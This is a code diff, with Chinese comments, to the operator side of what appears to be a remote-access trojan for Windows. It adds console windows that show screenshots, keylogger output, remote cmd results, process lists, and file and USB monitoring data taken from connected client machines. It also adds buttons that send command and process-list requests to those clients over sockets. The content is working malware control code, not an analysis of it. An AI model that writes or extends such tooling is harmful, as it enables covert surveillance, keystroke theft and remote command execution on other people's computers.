@@ -21,6 +21,14 @@
 #define TO_CLIENT_KEY		30001
 
 
+//自定义消息
+#define WM_OWN_SHOWCMD		0x0401					//显示CMD
+#define WM_OWN_SHOWPROCESS	0x0402					//显示进程信息
+#define WM_OWN_KEY			0x0403					//显示键盘记录
+#define WM_OWN_FILECONTROL	0x0404					//显示文件监控
+#define WM_OWN_USB			0x0405					//显示USB监控
+
+
 //包结构
 #pragma pack(push)
 #pragma pack(1)
@@ -57,10 +65,8 @@ struct ClientData
 	HANDLE		hScreenThread;	//屏幕显示线程句柄
 
 	HWND		hCmdWindow;		//Cmd窗口句柄
-	HANDLE		hCmdThread;		//Cmd显示线程句柄
 
 	HWND		hKeyWindow;		//键盘记录窗口句柄
-	HANDLE		hKeyThread;		//显示键盘记录线程句柄
 
 	ClientData* Next;			//指向下一个ClientData结构
 };
@@ -74,19 +80,22 @@ HANDLE		 hmutex1;		//定义全局互斥对象句柄（用来同步收到发送到客户端的包）
 HWND hWinMain;					//主窗口句柄
 SOCKET hSocketWait;				//用于等待客户端连接的套接字句柄		
 
+BOOL _stdcall _ShowUSB(HWND hWnd);
+BOOL _stdcall _ShowFileControl(HWND hWnd);
+BOOL _stdcall _ShowKey(HWND hWnd);
+BOOL _stdcall _ShowProcess(HWND hWnd);
+BOOL _stdcall _ShowCmd(HWND hWnd);
+BOOL _stdcall _ShowScreen(_Show* lpScreen);
 
 
-
-BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
-BOOL _stdcall _ShowKey(_Show* lpScreen);
 BOOL _stdcall _CheckClient();
 VOID _stdcall _InitSocket();
 BOOL _stdcall _ToClient(_Show* lpScreen);
-BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
-BOOL _stdcall _ShowScreen(_Show* lpScreen);
-BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
-BOOL _stdcall _ShowCmd(_Show* lpScreen);
 BOOL _stdcall _ReceiveClient();
+
+BOOL CALLBACK _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
+BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
+BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
 BOOL CALLBACK _DialogMain(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam);
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR pCmdLine, int nCmdShow)
 {
@@ -334,7 +343,7 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 
 		len = 0;
 		int timeout;
-		timeout = 1000 * 60; //60秒超时recv返回		
+		timeout = 1000 * 600; //600秒超时recv返回		
 		setsockopt(pClient->hSocketClient, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(int));
 
 		//接收来自客户端的数据(循环接收)
@@ -397,11 +406,12 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 		ReleaseMutex(pClient->hmutex);						//释放互斥对象
 		ReleaseMutex(pClient->hmutex);						//释放互斥对象
 		WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
-		delete[] pClient->stWrap.lpBuffer;			//释放内存
+		
 
 
 
-		switch (pClient->stWrap.dwType)
+
+		switch (pClient->stWrap.dwType)						//处理各种消息
 		{
 		case TO_CLIENT_SCREEN:				//屏幕包
 			stSendWrap.dwType = GET_CLIENT_SCREEN;				//发送命令。（截屏）
@@ -410,11 +420,31 @@ BOOL _stdcall _ToClient(_Show * lpScreen)
 			send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);
 			ReleaseMutex(hmutex1);						//释放互斥对象1
 			break;
+		case TO_CLIENT_CMD:
+			SendMessage(pClient->hCmdWindow, WM_OWN_SHOWCMD, 0, 0);
+			break;
+		case 40001:
+			SendMessage(pClient->hCmdWindow, WM_OWN_SHOWPROCESS, 0, 0);
+			break;
+		case TO_CLIENT_KEY:
+			SendMessage(pClient->hKeyWindow, WM_OWN_KEY, 0, 0);
+			break;
+
+		case 50001:
+			SendMessage(pClient->hKeyWindow, WM_OWN_FILECONTROL, 0, 0);
+			break;
+		case 60001:
+			SendMessage(pClient->hKeyWindow, WM_OWN_USB, 0, 0);
+			break;
 		}
 
+		delete[] pClient->stWrap.lpBuffer;			//释放内存
 	}
 	return 0;
 }
+
+
+
 
 
 
@@ -463,8 +493,14 @@ BOOL CALLBACK _DialogScreen(HWND hWnd, UINT message, WPARAM wParam, LPARAM lPara
 
 
 //cmd窗口（窗口回调）
-BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
+BOOL CALLBACK _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
+
+	char szPID[] = TEXT("PID");
+	char szExeName[] = TEXT("进程可执行文件名");
+	LVCOLUMN lvColumn;			//列属性
+	memset(&lvColumn, 0, sizeof(lvColumn));
+
 	ClientData* pClient = pHandClient;		//辅助指针
 	MyWrap	stSendWrap;			//请求包
 	char	szBuffer[256] ;
@@ -474,7 +510,7 @@ BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 	case WM_COMMAND:
 		switch (LOWORD(wParam))
 		{
-		case IDC_BUTTON1:
+		case IDC_BUTTON1:					//执行cmd命令
 			pClient = pHandClient;
 			while (pClient != NULL)
 			{
@@ -492,22 +528,35 @@ BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 				}
 				pClient = pClient->Next;
 			}
-			
+			break;
+
+		case IDC_BUTTON2:					//获得进程信息
+			pClient = pHandClient;
+			while (pClient != NULL)
+			{
+				if (pClient->hCmdWindow == hWnd)
+				{
+					stSendWrap.dwType = 40002;
+					stSendWrap.dwLength = 0;
+					WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求进程信息
+					ReleaseMutex(hmutex1);						//释放互斥对象1
+
+				}
+				pClient = pClient->Next;
+			}
+
 			break;
 		}
 		break;
+
+	case WM_OWN_SHOWCMD:
+		_ShowCmd(hWnd);
+		break;
+	case WM_OWN_SHOWPROCESS:
+		_ShowProcess(hWnd);
+		break;
 	case WM_CLOSE:										
-		pClient = pHandClient;
-		while (pClient != NULL)
-		{
-			if (pClient->hCmdWindow == hWnd)
-			{
-				TerminateThread(pClient->hCmdThread, 0);
-				CloseHandle(pClient->hCmdThread);
-				
-			}
-			pClient = pClient->Next;
-		}
 		EndDialog(hWnd, 0);
 		break;
 	case WM_INITDIALOG:
@@ -515,9 +564,24 @@ BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 			pClient = pClient->Next;
 		pClient->stShow.hWnd = hWnd;
 		pClient->stShow.dwItem = lParam;
-		pClient->hCmdThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ShowCmd, &pClient->stShow, 0, NULL);
-
 		pClient->hCmdWindow = hWnd;
+
+
+
+		//初始化进程显示列表
+		ListView_SetExtendedListViewStyle(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), LVS_EX_FULLROWSELECT);
+
+		lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
+		lvColumn.cx = 200;
+		lvColumn.pszText = szExeName;
+		ListView_InsertColumn(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), 0, &lvColumn);
+
+		lvColumn.mask = LVCF_TEXT | LVCF_WIDTH;
+		lvColumn.cx = 120;
+		lvColumn.pszText = szPID;
+		ListView_InsertColumn(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), 1, &lvColumn);
+
+
 		break;
 	default:
 		return FALSE;
@@ -532,36 +596,55 @@ BOOL _stdcall _DialogCmd(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 {
 
+	char szBuffer[0x256];
+	MyWrap	stSendWrap;
 	ClientData* pClient = pHandClient;		//辅助指针
 
 	switch (message)
 	{
-
-	case WM_CLOSE:										//关闭显示屏幕线程
-		pClient = pHandClient;
-		while (pClient != NULL)
+	case WM_OWN_KEY:
+		_ShowKey(hWnd);
+		break;
+	case WM_OWN_FILECONTROL:
+		_ShowFileControl(hWnd);
+		break;
+	case WM_OWN_USB:
+		_ShowUSB(hWnd);
+		break;
+	case WM_COMMAND:
+		switch (LOWORD(wParam))
 		{
-			if (pClient->hScreenWindow == hWnd)
+		case IDC_BUTTON1:
+			pClient = pHandClient;
+			while (pClient != NULL)
 			{
-				TerminateThread(pClient->hKeyThread, 0);
-				CloseHandle(pClient->hKeyThread);
-			}
-			pClient = pClient->Next;
-		}
-		EndDialog(hWnd, 0);
+				if (pClient->hKeyWindow == hWnd)
+				{
+					GetDlgItemText(hWnd, IDC_EDIT4, szBuffer, sizeof(szBuffer));
 
+					stSendWrap.dwType = 50002;
+					stSendWrap.dwLength = lstrlen(szBuffer);
+					WaitForSingleObject(hmutex1, INFINITE);		//请求互斥对象1
+					send(pClient->hSocketClient, (char*)&stSendWrap, 8, 0);				//请求执行cmd
+					send(pClient->hSocketClient, szBuffer, stSendWrap.dwLength, 0);
+					ReleaseMutex(hmutex1);						//释放互斥对象1
+
+				}
+				pClient = pClient->Next;
+			}
+			break;
+		}
+		break;
+	case WM_CLOSE:										//关闭显示屏幕线程
+		EndDialog(hWnd, 0);
 		break;
 	case WM_INITDIALOG:
-
 		for (int i = 0;i < lParam; i++)		//保存对应屏幕窗口信息
 			pClient = pClient->Next;
 
 		pClient->stShow.hWnd = hWnd;
 		pClient->stShow.dwItem = lParam;
-
-		pClient->hKeyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)_ShowKey, &pClient->stShow, 0, NULL);
 		pClient->hKeyWindow = hWnd;
-
 		break;
 	default:
 		return FALSE;
@@ -570,7 +653,7 @@ BOOL CALLBACK _DialogKey(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
 }
 
 
-//显示截屏
+//显示屏幕
 BOOL _stdcall _ShowScreen(_Show* lpScreen)
 {
 
@@ -586,7 +669,7 @@ BOOL _stdcall _ShowScreen(_Show* lpScreen)
 	{
 		pClient = pClient->Next;
 	}
-
+	
 	MyWrap	stSendWrap;			//请求包
 	stSendWrap.dwType = GET_CLIENT_SCREEN;
 	stSendWrap.dwLength = 0;
@@ -635,62 +718,143 @@ BOOL _stdcall _ShowScreen(_Show* lpScreen)
 	ReleaseDC(lpScreen->hWnd, hDeskDc);
 	DeleteDC(hMyDc);
 
-
-
 	return 0;
 }
 
 
-
-//显示cmd
-BOOL _stdcall _ShowCmd(_Show* lpScreen)
+BOOL _stdcall _ShowCmd(HWND hWnd)
 {
-
 	ClientData* pClient = pHandClient;		//辅助指针
-	for (int i = 0;i < lpScreen->dwItem; i++)
+	while (pClient != NULL)
 	{
-		pClient = pClient->Next;
-	}
-
-	while (1)
-	{
-
-		if (pClient->stWrap.dwType == TO_CLIENT_CMD)			//显示cmd
+		if (pClient->hCmdWindow == hWnd)
 		{
-			WaitForSingleObject(pClient->hmutex, INFINITE);		//请求互斥对象
-			SendMessage(GetDlgItem(pClient->hCmdWindow, IDC_EDIT1), EM_SETSEL, -2, -1);					//最加写cmd数据
+
+			SendMessage(GetDlgItem(pClient->hCmdWindow, IDC_EDIT1), EM_SETSEL, -2, -1);					//追加写cmd数据
 			SendMessage(GetDlgItem(pClient->hCmdWindow, IDC_EDIT1), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
-			ReleaseMutex(pClient->hmutex);						//释放互斥对象句柄
+			break;
 		}
-
+		pClient = pClient->Next;
 	}
-
 	return 0;
 }
 
 
-//显示键盘记录
-BOOL _stdcall _ShowKey(_Show* lpScreen)
+
+BOOL _stdcall _ShowProcess(HWND hWnd)
 {
+	DWORD  x;
+	DWORD  i;
+	DWORD  dwPid;
+	char	szBuffer[256];
+	LVITEM lvItem;				//行属性
+	
+	memset(&lvItem, 0, sizeof(lvItem));
 	ClientData* pClient = pHandClient;		//辅助指针
-	for (int i = 0;i < lpScreen->dwItem; i++)
+	while (pClient != NULL)
 	{
+		if (pClient->hCmdWindow == hWnd)
+		{
+			ListView_DeleteAllItems(GetDlgItem(pClient->hCmdWindow, IDC_LIST1));
+			x = 0;
+			i = 0;
+			while (((BYTE*)pClient->stWrap.lpBuffer + x)[0] == 0 && ((BYTE*)pClient->stWrap.lpBuffer + x)[1] != 0)
+			{
+				memset(&lvItem, 0, sizeof(lvItem));
+				lvItem.mask = LVIF_TEXT;
+				lvItem.iItem = i;
+				ListView_InsertItem(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), &lvItem);
+
+				x++;
+				lstrcpy(szBuffer, (LPCSTR)(((BYTE*)pClient->stWrap.lpBuffer) + x));
+				lvItem.iSubItem = 0;
+				lvItem.pszText = szBuffer;
+				ListView_SetItem(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), &lvItem);
+
+
+				x = x + lstrlen((LPCSTR)((((BYTE*)pClient->stWrap.lpBuffer)) + x));
+				x++;
+				dwPid = *((DWORD*)(((BYTE*)pClient->stWrap.lpBuffer) + x));
+				
+				wsprintf(szBuffer, TEXT("%d"), dwPid);
+				lvItem.iSubItem = 1;
+				lvItem.pszText = szBuffer;
+				ListView_SetItem(GetDlgItem(pClient->hCmdWindow, IDC_LIST1), &lvItem);
+
+
+				x = x + 4;
+				i++;
+
+			}
+			
+
+			break;
+		}
 		pClient = pClient->Next;
 	}
+	return 0;
 
-	while (1)
+}
+
+
+//键盘记录显示
+BOOL _stdcall _ShowKey(HWND hWnd)
+{
+	ClientData* pClient = pHandClient;		//辅助指针
+	while (pClient != NULL)
 	{
-
-
-		if (pClient->stWrap.dwType == TO_CLIENT_KEY)				//显示键盘包
+		if (pClient->hKeyWindow == hWnd)
 		{
-			WaitForSingleObject(pClient->hmutex, INFINITE);//请求互斥对象
 			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT1), EM_SETSEL, -2, -1);					//最加写键盘记录数据
 			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT1), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
-			ReleaseMutex(pClient->hmutex);				  //释放互斥对象句柄
-
+			break;
 		}
+		pClient = pClient->Next;
+	}
 
+
+	return 0;
+}
+
+
+BOOL _stdcall _ShowFileControl(HWND hWnd)
+{
+	char szBuffer[256] = "\r\n";
+	ClientData* pClient = pHandClient;		//辅助指针
+	while (pClient != NULL)
+	{
+		if (pClient->hKeyWindow == hWnd)
+		{
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT2), EM_SETSEL, -2, -1);					//最加写文件监控数据
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT2), EM_REPLACESEL, true, (DWORD)szBuffer);
+
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT2), EM_SETSEL, -2, -1);					//最加写文件监控数据
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT2), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
+			break;
+		}
+		pClient = pClient->Next;
+	}
+	return 0;
+}
+
+
+
+BOOL _stdcall _ShowUSB(HWND hWnd)
+{
+	char szBuffer[256] = "\r\n";
+	ClientData* pClient = pHandClient;		//辅助指针
+	while (pClient != NULL)
+	{
+		if (pClient->hKeyWindow == hWnd)
+		{
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT3), EM_SETSEL, -2, -1);					//最加写文件监控数据
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT3), EM_REPLACESEL, true, (DWORD)szBuffer);
+
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT3), EM_SETSEL, -2, -1);					//最加写文件监控数据
+			SendMessage(GetDlgItem(pClient->hKeyWindow, IDC_EDIT3), EM_REPLACESEL, true, (DWORD)pClient->stWrap.lpBuffer);
+			break;
+		}
+		pClient = pClient->Next;
 	}
 	return 0;
 }
